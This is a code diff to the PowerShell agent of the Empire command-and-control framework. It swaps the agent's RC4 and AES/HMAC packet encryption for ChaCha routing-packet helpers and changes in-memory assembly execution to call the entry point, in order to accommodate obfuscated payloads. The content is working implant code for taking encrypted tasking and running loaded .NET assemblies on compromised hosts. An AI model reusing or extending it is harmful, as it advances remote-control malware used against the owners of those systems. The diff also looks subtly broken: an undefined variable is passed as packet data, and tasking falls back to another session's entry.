@@ -91,7 +91,6 @@ function Invoke-Empire {
     ############################################################
 
     $Encoding = [System.Text.Encoding]::ASCII;
-    $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
 
     $script:AgentDelay = $AgentDelay;
     $script:AgentJitter = $AgentJitter;
@@ -147,29 +146,6 @@ function Invoke-Empire {
     # Command Helpers
     #
     ############################################################
-
-    function ConvertTo-Rc4ByteStream {
-        # RC4 encryption/decryption
-        #   used in New-RoutingPacket/Decode-RoutingPacket
-        Param ($In, $RCK)
-        begin {
-            [Byte[]] $S = 0..255;
-            $J = 0;
-            0..255 | ForEach-Object {
-                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $S[$_], $S[$J] = $S[$J], $S[$_];
-            };
-            $I = $J = 0;
-        }
-        process {
-            ForEach($Byte in $In) {
-                $I = ($I + 1) % 256;
-                $J = ($J + $S[$I]) % 256;
-                $S[$I], $S[$J] = $S[$J], $S[$I];
-                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
-            }
-        }
-    }
 
     function Get-HexString {
         param([byte]$Data)
@@ -620,144 +596,39 @@ function Invoke-Empire {
     # Core agent encryption/packet processing function
     #
     ############################################################
-
-    function Encrypt-Bytes {
-        param($bytes)
-        # get a random IV
-        $IV = [byte] 0..255 | Get-Random -count 16;
-        try {
-            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-        }
-        catch {
-            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-        }
-        $AES.Mode = "CBC";
-        $AES.Key = $Encoding.GetBytes($SessionKey);
-        $AES.IV = $IV;
-        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
-        # append the MAC
-        $HMAC.Key = $Encoding.GetBytes($SessionKey);
-        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
-    }
-
-    function Decrypt-Bytes {
-        param ($inBytes)
-        if($inBytes.Length -gt 32) {
-            # Verify the HMAC
-            $mac = $inBytes[-10..-1];
-            $inBytes = $inBytes[0..($inBytes.length - 11)];
-            $hmac.Key = $Encoding.GetBytes($SessionKey);
-            $expected = $hmac.ComputeHash($inBytes)[0..9];
-            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
-                return;
-            }
-
-            # extract the IV
-            $IV = $inBytes[0..15];
-            try {
-                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-            }
-            catch {
-                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-            }
-            $AES.Mode = "CBC";
-            $AES.Key = $Encoding.GetBytes($SessionKey);
-            $AES.IV = $IV;
-            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
-        }
-    }
-
     function New-RoutingPacket {
         param($EncData, $Meta)
-
-        # build the RC4 routing packet
-        #   Meta:
-        #       TASKING_REQUEST = 4
-        #       RESULT_POST = 5
-
-        if($EncData) {
-            $EncDataLen = $EncData.Length;
-        }
-        else {
-            $EncDataLen = 0;
-        }
-
         $SKB = $Encoding.GetBytes($StagingKey);
-        $IV=[BitConverter]::GetBytes($(Get-Random));
-        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen);
-        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB);
-
-        if($EncData) {
-            ($IV + $RoutingPacketData + $EncData);
-        }
-        else {
-            ($IV + $RoutingPacketData);
-        }
+        $RoutingPacketData = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $Script:SessionId -Language 1 -Meta $Meta -Additional 0 -EncData $EncBytes
+        return $RoutingPacketData
     }
 
     function Decode-RoutingPacket {
         param($PacketData)
+        [byte[]]$SKB = [Text.Encoding]::UTF8.GetBytes($StagingKey)
 
-        <#
-        Decode a first level server-response "routing packet"
+        # Decode once; the function already coerces object[] to byte[]
+        $pktMap = Decode-ChaChaRoutingPacket -PacketData $PacketData -StagingKeyBytes $SKB
 
-            Routing packet structure:
 
-                [4 bytes randomIV]
-                RC4s(
-                    [8 bytes for sessionID]
-                    [1 byte for language]
-                    [1 byte for meta info]
-                    [2 bytes for extra info]
-                    [4 bytes for packet length]
-                )
-        #>
-
-        if ($PacketData.Length -ge 20) {
-
-            $Offset = 0;
-
-            while($Offset -lt $PacketData.Length) {
-                # extract out the routing packet fields
-                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)];
-                $RoutingIV = $RoutingPacket[0..3];
-                $RoutingEncData = $RoutingPacket[4..19];
-                $Offset += 20;
-
-                # get the staging key bytes
-                $SKB = $Encoding.GetBytes($StagingKey);
-
-                # decrypt the routing packet
-                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB);
-                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7]);
-                # write-host "PacketSessionID: $PacketSessionID"
-                # write-host "RoutingData len: $($RoutingData)"
-                # write-host "$([System.BitConverter]::ToString($RoutingData[0..15]))"
-                $Language = $RoutingData[8];
-                $Meta = $RoutingData[9];
-                # write-host "Meta: $Meta"
-                $Extra = $RoutingData[10..11];
-                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12);
-
-                if ($PacketLength -lt 0) {
-                    # Write-Host "Invalid PacketLength: $PacketLength"
-                    break;
-                }
-
-                if ($PacketSessionID -eq $script:SessionID) {
-                    # if this tasking is for us
-                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)];
-                    $Offset += $PacketLength;
-                    Process-TaskingPackets $EncData;
-                }
-                else {
-                    # TODO: forward taskings on to other clients?
-                }
-            }
+        # Pick the entry for our session, or fall back to the first
+        $fields = $null
+        if ($pktMap.ContainsKey($script:SessionID)) {
+            $fields = $pktMap[$script:SessionID]
+        } else {
+            $firstKey = $pktMap.Keys | Select-Object -First 1
+            if ($firstKey) { $fields = $pktMap[$firstKey] }
         }
-        else {
-            # Write-Host "Invalid PacketData.Length: $($PacketData.Length)"
-        }
+
+
+        # The decoder returns: @(lang, meta, add, encData)
+        [byte]  $Language = [byte] $fields[0]
+        [byte]  $Meta     = [byte] $fields[1]
+        [UInt16]$Extra    = [UInt16]$fields[2]
+        [byte[]]$EncData  = [byte[]]$fields[3]
+
+        # Now process the encrypted payload (your existing function)
+        Process-TaskingPackets $EncData
     }
 
     function Encode-Packet {
@@ -1039,6 +910,7 @@ function Invoke-Empire {
                     $assemBytes = $output.ToArray()
 
                     $assembly = [Reflection.Assembly]::Load($assemBytes)
+                    # can probably remove programtype and mainmethod. Invoke via entrypoint instead to accomodate obfuscation
                     $programType = $assembly.GetType("Program")
                     $mainMethod = $programType.GetMethod("Main")
 
@@ -1088,7 +960,7 @@ function Invoke-Empire {
 
                                     [Console]::SetOut($pipeWriter)
 
-                                    $assembly.GetType("Program").GetMethod("Main").Invoke($null, $arguments)
+                                    $assembly.EntryPoint.Invoke($null, $arguments)
                                 }
                                 finally {
                                     $pipe.Dispose()
@@ -1119,7 +991,7 @@ function Invoke-Empire {
                         $StringWriter = New-Object IO.StringWriter;
                         [Console]::SetOut($StringWriter);
 
-                        $null = $mainMethod.Invoke($null, $arguments)
+                        $null = $assembly.EntryPoint.Invoke($null, $arguments)
 
                         [Console]::SetOut($OldConsoleOut)
                         $result = $StringWriter.ToString()
@@ -1158,7 +1030,6 @@ function Invoke-Empire {
                         $output.Write($buffer, 0, $bytesRead);
                         $bytesRead = $sr.Read($buffer, 0, $buffer.Length);
                     }
-
                     $assemBytes = $output.ToArray();
                     $assembly = [Reflection.Assembly]::Load($assemBytes)
 
@@ -1203,7 +1074,7 @@ function Invoke-Empire {
                             $originalConsoleOut = [Console]::Out
                             [Console]::SetOut($pipeWriter)
 
-                            $assembly.GetType("Program").GetMethod("Main").Invoke($null, $arguments)
+                            $assembly.EntryPoint.Invoke($null, $arguments)
                         }
                         finally {
                             $pipe.Dispose()
@@ -1393,7 +1264,7 @@ function Invoke-Empire {
         param($Tasking)
 
         # Decrypt the tasking and process it appropriately
-        $TaskingBytes = Decrypt-Bytes $Tasking;
+        $TaskingBytes = Decrypt-Bytes -Key $Script:SessionKey -In $Tasking;
         if (-not $TaskingBytes) {
             return;
         }
@@ -1406,7 +1277,6 @@ function Invoke-Empire {
         $TaskID = $Decoded[3];
         $Length = $Decoded[4];
         $Data = $Decoded[5];
-
         # TODO: logic to handle taskings that span multiple packets
 
         # any remaining sections of the packet
